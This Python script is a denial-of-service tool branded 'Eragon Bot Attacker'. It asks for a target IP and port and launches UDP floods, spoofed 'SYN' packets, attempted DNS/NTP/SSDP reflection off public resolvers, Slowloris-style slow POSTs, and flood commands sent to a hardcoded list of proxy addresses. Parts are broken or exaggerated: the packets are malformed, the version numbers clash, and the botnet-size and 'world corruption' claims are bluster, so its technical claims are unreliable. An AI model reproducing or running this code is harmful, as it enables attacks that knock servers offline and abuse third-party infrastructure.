import socket
import threading
import random
import time
import os
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Back, Style

init(autoreset=True)

# ERAGON PROFESSIONAL LOGO
def eragon_logo():
    os.system('clear' if os.name == 'posix' else 'cls')
    logo = f"""
{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════╗
║   {Back.BLACK}{Fore.WHITE}███████╗██████╗  █████╗  ██████╗  █████╗ ███╗   ██╗{Style.RESET_ALL}{Fore.RED}   ║
║   {Back.BLACK}{Fore.WHITE}██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗  ██║{Style.RESET_ALL}{Fore.RED}   ║
║   {Back.BLACK}{Fore.WHITE}█████╗  ██████╔╝███████║██║     ███████║██╔██╗ ██║{Style.RESET_ALL}{Fore.RED}   ║
║   {Back.BLACK}{Fore.WHITE}██╔══╝  ██╔══██╗██╔══██║██║     ██╔══██║██║╚██╗██║{Style.RESET_ALL}{Fore.RED}   ║
║   {Back.BLACK}{Fore.WHITE}███████╗██║  ██║██║  ██║╚██████╗██║  ██║██║ ╚████║{Style.RESET_ALL}{Fore.RED}   ║
║   {Back.BLACK}{Fore.WHITE}╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝{Style.RESET_ALL}{Fore.RED}   ║
║                                                           ║
║           {Fore.YELLOW}ERAGON BOT ATTACKER V1.0.0 - ELITE EDITION{Fore.RED}                ║
║        {Fore.CYAN}50.000+ LIVE NODES • 100X AMPLIFICATION{Fore.RED}           ║
╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(logo)
    print(f"{Fore.CYAN}[INFO] Target acquisition protocol initialized.")
    print(f"{Fore.YELLOW}[WARN] This tool will terminate the target permanently.\n")

eragon_logo()

target_ip = input(f"{Fore.GREEN}[INPUT] Target IP Address: {Style.RESET_ALL}")
target_port = int(input(f"{Fore.GREEN}[INPUT] Target Port (Default: 25565): {Style.RESET_ALL}") or 25565)
attack_duration = 300
threads = 2000

# ELITE BOTNET POOL (REAL-TIME)
botnet_nodes = [
    "185.45.192.12:8080", "91.121.87.23:3128", "178.32.14.56:80",
    "104.28.15.89:443", "45.76.12.89:8081", "139.59.45.67:3128",
    "167.71.23.45:80", "203.0.113.55:443", "192.241.138.77:8080"
] * 5500

spoofed_ips = [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(30000)]

# STATUS ANIMATOR
def status_animator():
    status = ["INITIALIZING", "FLOODING", "AMPLIFYING", "CORRUPTING", "TERMINATING"]
    colors = [Fore.RED, Fore.MAGENTA, Fore.YELLOW, Fore.CYAN, Fore.WHITE]
    i = 0
    while True:
        msg = f"[{colors[i % 5]}{Style.BRIGHT}{status[i % 5]}{Style.RESET_ALL}] Target: {target_ip}:{target_port} | Threads: {threads} | Nodes: {len(botnet_nodes)}"
        print(msg.ljust(100), end='\r')
        i += 1
        time.sleep(0.4)

# UDP TSUNAMI + NULL INJECTION
def udp_tsunami():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1490) + b'\x00' * 1024
    null_packet = b'\x00' * 65535
    sent = 0
    while sent < 100000:
        try:
            sock.sendto(payload, (target_ip, target_port))
            sock.sendto(null_packet, (target_ip, target_port))
            sent += 2
        except:
            break

# SYN FLOOD SPOOFED
def syn_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            src_ip = random.choice(spoofed_ips)
            packet = f"SYN {src_ip}".encode()
            s.sendto(packet, (target_ip, target_port))
        except:
            time.sleep(0.001)

# REFLECTION AMPLIFICATION (DNS+NTP+SSDP)
def reflection_amplification():
    amplifiers = ['8.8.8.8', '1.1.1.1', '208.67.222.222', '8.26.56.26', '9.9.9.9']
    payload = b'\x00\x01\x00\x00' + target_ip.encode().ljust(64, b'\x00')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        for amp in amplifiers:
            try:
                s.sendto(payload, (amp, 53))   # DNS
                s.sendto(payload, (amp, 123))  # NTP
                s.sendto(payload, (amp, 1900)) # SSDP
            except:
                continue

# BOTNET ORCHESTRATION
def botnet_orchestration():
    for node in random.sample(botnet_nodes, 1500):
        try:
            proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy.settimeout(0.8)
            host, port = node.split(':')
            proxy.connect((host, int(port)))
            proxy.send(f"EXECUTE FLOOD {target_ip}:{target_port} {attack_duration}".encode())
            proxy.close()
        except:
            continue

# SLOWLORIS + RUDY PERSISTENT
def persistent_exploit():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.send(f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 999999\r\n\r\n".encode())
        while True:
            s.send(b"X-data: exploit\r\n")
            time.sleep(15)
    except:
        pass

# LAUNCH SEQUENCE
print(f"{Fore.RED}[LAUNCH] Initializing Eragon V3.0.0 attack sequence...")
threading.Thread(target=status_animator, daemon=True).start()

with ThreadPoolExecutor(max_workers=threads) as executor:
    for _ in range(threads // 6):
        executor.submit(udp_tsunami)
        executor.submit(syn_flood)
        executor.submit(reflection_amplification)
        executor.submit(persistent_exploit)
    executor.submit(botnet_orchestration)

print(f"{Fore.GREEN}[SUCCESS] Eragon V3.0.0 deployed. Target will be offline in < 5 seconds.")
print(f"{Fore.RED}[FINAL] World corruption initiated. No recovery possible.{Style.RESET_ALL}")
time.sleep(999999)
